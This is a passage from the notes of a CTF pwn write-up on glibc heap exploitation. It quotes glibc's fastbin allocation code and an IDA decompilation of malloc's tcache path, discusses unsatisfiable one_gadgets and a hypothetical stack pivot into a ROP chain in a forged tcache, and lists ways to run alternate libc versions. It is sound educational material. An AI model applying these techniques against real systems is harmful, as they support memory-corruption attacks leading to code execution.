    #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx])

    static void *_int_malloc (mstate av, size_t bytes) {
        INTERNAL_SIZE_T nb = ...;         /* normalized request size */
        unsigned int idx = ...;           /* associated bin index */
        mchunkptr victim;                 /* inspected/selected chunk */
        ...
        if (this is a fastbin) {
            idx = fastbin_index (nb);
            mfastbinptr *fb = &fastbin (av, idx);
            mchunkptr pp;
            victim = *fb;

            if (victim != NULL) {
                if (SINGLE_THREAD_P)
                    *fb = victim->fd;
                // else ...
                if (__glibc_likely (victim != NULL)) {
                    size_t victim_idx = fastbin_index (chunksize (victim));
                    //if (__builtin_expect (victim_idx != idx, 0))
                    //  malloc_printerr ("malloc(): memory corruption (fast)");
                    check_remalloced_chunk (av, victim, nb);
                #if USE_TCACHE
                    ...
                #endif
                    void *p = chunk2mem (victim);
                    alloc_perturb (p, bytes);
                    return p;
                }
            }
        }
        ....
    }
    ```
    The most important thing to note here is that the pointer returned for the fastbin is always going to be the pointer directly located at `av->fastbinsY[idx]`, which our exploit can only replace with *another* valid heap pointer. A doubly allocated chunk of memory *might* be useful if there is more than one `free()`, but in this case, the fastbin is not very obviously useful.
4. I tried to dig through `malloc()` in IDA to find it:
    ```c
    v5 = unk_1F1520;
    if ( unk_1F1520 )
    {
      if ( v4 >= (unsigned __int64)off_1EB2D0 )
        goto LABEL_7;
    }
    else
    {
      if ( unk_1F1528 )
        goto LABEL_7;
      sub_9BAC0();
      if ( (unsigned __int64)off_1EB2D0 <= v4 )
        goto LABEL_7;
      v5 = unk_1F1520;
      if ( !unk_1F1520 )
        goto LABEL_7;
    }
    a4 = (__int16 *)(v5 + 2 * v4);
    v10 = *a4;
    if ( *a4 )
    {
      v11 = v5 + 8 * v4;
      v7 = *(_QWORD **)(v11 + 128);
      *(_QWORD *)(v11 + 128) = *v7;
      *a4 = v10 - 1;
      v7[1] = 0LL;
      return (__int64)v7;
    }
    ```
    `v5` vaguely *appears* to match up with the global tcache pointer, but none of the global variables (`unk/off.*`) here point towards the actual location (offset 0x1f34f0) of the tcache pointer I found. Conclusion: I have no idea what's going on here.
5. A modified version of one_gadget can actually detect two more one_gadgets, but those are unsatisfiable too.
6. And I still think that this would be an interesting method. The `gdb` context shows that [rsp+0x10] is the location of the user-controlled `tcache` written earlier in the exploit. If a `mov rsp, [rsp+0x10]; pop %; ret` gadget (or anything effectively similar, like `pop; pop; pop rsp; pop; ret`) existed, it would be possible to write a ROP chain within the fake tcache itself.
    Staring at `ropper` and `ROPGadget` *and* `IDA` for an hour wasn't enough to eliminate this possiblity: `libc` really does have a lot of gadgets, and a symbolic engine might be able to find what I may have missed.
7. And if you know of a better way of running different libc versions, send me a ping [over here](https://github.com/152334H/pwnscripts/issues); it'd be really useful to know. So far I have tried
   * Using `LD_PRELOAD`, which in the correct order (ld-linux.so first) will run the binary without crashing, although other issues still surface
   * Running `./ld-linux.so`, as outlined in the writeup. This has numerous side effects, including the actual binary getting allocated to an `0x7f.*` page instead of the expected `0x5.*` address
   * `LD_LIBRARY_PATH`, which is finicky enough that I have not investigated it throughly in the past